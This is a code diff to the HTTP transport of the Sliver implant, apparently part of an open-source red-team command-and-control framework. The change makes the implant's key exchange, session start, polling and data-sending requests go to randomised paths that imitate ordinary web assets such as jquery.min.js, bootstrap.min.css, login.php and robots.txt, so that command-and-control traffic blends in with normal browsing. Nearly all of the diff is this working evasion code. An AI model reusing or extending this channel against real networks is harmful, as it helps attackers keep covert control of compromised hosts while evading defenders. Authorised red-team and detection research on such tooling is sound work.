@@ -2,6 +2,14 @@ package transports
 
 // {{if .HTTPServer}}
 
+// Procedural C2
+// ===============
+// .txt = rsakey
+// .css = start
+// .php = session
+//  .js = poll
+// .png = stop
+
 import (
 	"bytes"
 	"crypto/rsa"
@@ -12,10 +20,12 @@ import (
 	"io/ioutil"
 	"strings"
 
+	"sync"
 	// {{if .Debug}}
 	"log"
 	// {{end}}
 
+	"math/rand"
 	"net"
 	"net/http"
 	"net/url"
@@ -87,7 +97,11 @@ func (s *SliverHTTPClient) SessionInit() error {
 }
 
 func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
-	req, _ := http.NewRequest("GET", fmt.Sprintf("%s/rsakey", s.Origin), nil)
+	uri := s.txtURL()
+	// {{if .Debug}}
+	log.Printf("[http] GET -> %s", uri)
+	// {{end}}
+	req, _ := http.NewRequest("GET", uri, nil)
 	resp, err := s.Client.Do(req)
 	if err != nil || resp.StatusCode != 200 {
 		// {{if .Debug}}
@@ -123,7 +137,7 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 // session key yet.
 func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	reader := bytes.NewReader(sessionInit) // Already RSA encrypted
-	uri := s.toURL("/start")
+	uri := s.cssURL()
 	req, _ := http.NewRequest("POST", uri, reader)
 	// {{if .Debug}}
 	log.Printf("[http] POST -> %s", uri)
@@ -142,15 +156,18 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 		return err
 	}
 	s.SessionID = string(sessionID)
+	// {{if .Debug}}
+	log.Printf("[http] New session id: %v", s.SessionID)
+	// {{end}}
 	return nil
 }
 
-// Get - Perform an HTTP GET request
-func (s *SliverHTTPClient) Get(urlPath string) ([]byte, error) {
+// Poll - Perform an HTTP GET request
+func (s *SliverHTTPClient) Poll() ([]byte, error) {
 	if s.SessionID == "" || s.SessionKey == nil {
 		return nil, errors.New("no session")
 	}
-	uri := s.toURL(urlPath)
+	uri := s.jsURL()
 	req, _ := http.NewRequest("GET", uri, nil)
 	// {{if .Debug}}
 	log.Printf("[http] POST -> %s", uri)
@@ -166,6 +183,9 @@ func (s *SliverHTTPClient) Get(urlPath string) ([]byte, error) {
 		return nil, errors.New("Non-200 response code")
 	}
 	if resp.StatusCode == 403 {
+		// {{if .Debug}}
+		log.Printf("Server responded with invalid session for %v", s.SessionID)
+		// {{end}}
 		return nil, errors.New("invalid session")
 	}
 	respData, _ := ioutil.ReadAll(resp.Body)
@@ -173,14 +193,14 @@ func (s *SliverHTTPClient) Get(urlPath string) ([]byte, error) {
 	return GCMDecrypt(*s.SessionKey, respData)
 }
 
-// Post - Perform an HTTP POST request
-func (s *SliverHTTPClient) Post(urlPath string, data []byte) error {
+// Send - Perform an HTTP POST request
+func (s *SliverHTTPClient) Send(data []byte) error {
 	if s.SessionID == "" || s.SessionKey == nil {
 		return errors.New("no session")
 	}
 	reqData, err := GCMEncrypt(*s.SessionKey, data)
 	reader := bytes.NewReader(reqData)
-	uri := s.toURL(urlPath)
+	uri := s.phpURL()
 	// {{if .Debug}}
 	log.Printf("[http] POST -> %s", uri)
 	// {{end}}
@@ -198,40 +218,115 @@ func (s *SliverHTTPClient) Post(urlPath string, data []byte) error {
 	return nil
 }
 
-func (s *SliverHTTPClient) toURL(urlPath string) string {
+func (s *SliverHTTPClient) jsURL() string {
 	curl, _ := url.Parse(s.Origin)
-	curl.Path = path.Join(curl.Path, urlPath)
-	q := curl.Query()
-	q.Set("sessionid", s.SessionID)
-	curl.RawQuery = q.Encode()
+	segments := []string{"js", "static", "assets", "dist", "javascript"}
+	filenames := []string{"underscore.min.js", "jquery.min.js", "bootstrap.min.js"}
+	curl.Path = path.Join(s.randomPath(segments, filenames)...)
 	return curl.String()
+}
+
+func (s *SliverHTTPClient) cssURL() string {
+	curl, _ := url.Parse(s.Origin)
+	segments := []string{"css", "static", "assets", "dist", "stylesheets", "style"}
+	filenames := []string{"bootstrap.min.css"}
+	curl.Path = path.Join(s.randomPath(segments, filenames)...)
+	return curl.String()
+}
+
+func (s *SliverHTTPClient) phpURL() string {
+	curl, _ := url.Parse(s.Origin)
+	segments := []string{"api", "rest", "larvel", "wordpress"}
+	filenames := []string{"login.php", "signin.php", "api.php", "samples.php"}
+	curl.Path = path.Join(s.randomPath(segments, filenames)...)
+	return curl.String()
+}
+
+func (s *SliverHTTPClient) txtURL() string {
+	curl, _ := url.Parse(s.Origin)
+	segments := []string{"static", "www", "assets", "textual", "nfo", "sample"}
+	filenames := []string{"robots.txt", "sample.txt", "info.txt"}
+	curl.Path = path.Join(s.randomPath(segments, filenames)...)
+	return curl.String()
+}
+
+func (s *SliverHTTPClient) randomPath(segments []string, filenames []string) []string {
+	seed := rand.NewSource(time.Now().Unix())
+	insecureRand := rand.New(seed)
+	n := insecureRand.Intn(2) // How many segements?
+	genSegments := []string{}
+	for index := 0; index < n; index++ {
+		seg := segments[insecureRand.Intn(len(segments))]
+		genSegments = append(genSegments, seg)
+	}
+	filename := filenames[insecureRand.Intn(len(filenames))]
+	genSegments = append(genSegments, filename)
+	return genSegments
 }
 
 // [ HTTP(S) Clients ] ------------------------------------------------------------
 
 func httpClient(address string) *SliverHTTPClient {
+	jar := cookieJar()
 	return &SliverHTTPClient{
 		Origin: fmt.Sprintf("http://%s", address),
 		Client: &http.Client{
+			Jar:     jar,
 			Timeout: defaultReqTimeout,
 		},
 	}
 }
 
 func httpsClient(address string) *SliverHTTPClient {
-	var netTransport = &http.Transport{
+	netTransport := &http.Transport{
 		Dial: (&net.Dialer{
 			Timeout: defaultNetTimeout,
 		}).Dial,
 		TLSHandshakeTimeout: defaultNetTimeout,
 	}
+	jar := cookieJar()
 	return &SliverHTTPClient{
 		Origin: fmt.Sprintf("https://%s", address),
 		Client: &http.Client{
+			Jar:       jar,
 			Timeout:   defaultReqTimeout,
 			Transport: netTransport,
 		},
 	}
+}
+
+func cookieJar() *Jar {
+	return &Jar{
+		lk:      sync.Mutex{},
+		cookies: map[string][]*http.Cookie{},
+	}
+}
+
+type Jar struct {
+	lk      sync.Mutex
+	cookies map[string][]*http.Cookie
+}
+
+func NewJar() *Jar {
+	jar := new(Jar)
+	jar.cookies = make(map[string][]*http.Cookie)
+	return jar
+}
+
+// SetCookies handles the receipt of the cookies in a reply for the
+// given URL.  It may or may not choose to save the cookies, depending
+// on the jar's policy and implementation.
+func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
+	jar.lk.Lock()
+	jar.cookies["_"] = cookies
+	jar.lk.Unlock()
+}
+
+// Cookies returns the cookies to send in a request for the given URL.
+// It is up to the implementation to honor the standard cookie use
+// restrictions such as in RFC 6265.
+func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
+	return jar.cookies["_"]
 }
 
 // {{end}} -HTTPServer
